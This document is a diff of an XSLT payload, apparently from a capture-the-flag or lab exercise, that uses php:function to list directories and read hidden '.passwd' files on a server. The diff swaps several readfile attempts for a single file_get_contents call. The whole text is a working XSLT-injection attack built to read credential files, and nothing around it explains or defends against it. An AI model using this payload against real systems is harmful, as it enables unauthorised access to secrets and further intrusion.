@@ -45,22 +45,7 @@
         <br/>
         <xsl:value-of select="php:function('readdir')"/>
         <br/>
-        <xsl:value-of select="php:function('readfile','.6ff3200bee785801f420fba826ffcdee/.passwd')" />
-        <br/>
-        <xsl:value-of select="php:function('readfile','/.6ff3200bee785801f420fba826ffcdee/.passwd')" />
-        <br/>
-        <xsl:value-of select="php:function('readfile','._firewall/.passwd')" />
-        <br/>
-        <xsl:value-of select="php:function('readfile','/._firewall/.passwd')" />
-        <br/>
-        <xsl:copy-of select="php:function('readfile','.6ff3200bee785801f420fba826ffcdee/.passwd')" />
-        <br/>
-        <xsl:copy-of select="php:function('readfile','/.6ff3200bee785801f420fba826ffcdee/.passwd')" />
-        <br/>
-        <xsl:copy-of select="php:function('readfile','._firewall/.passwd')" />
-        <br/>
-        <xsl:copy-of select="php:function('readfile','/._firewall/.passwd')" />
-        <br/>
+        <xsl:value-of select="php:function('file_get_contents','.6ff3200bee785801f420fba826ffcdee/.passwd')" />
         
     
 
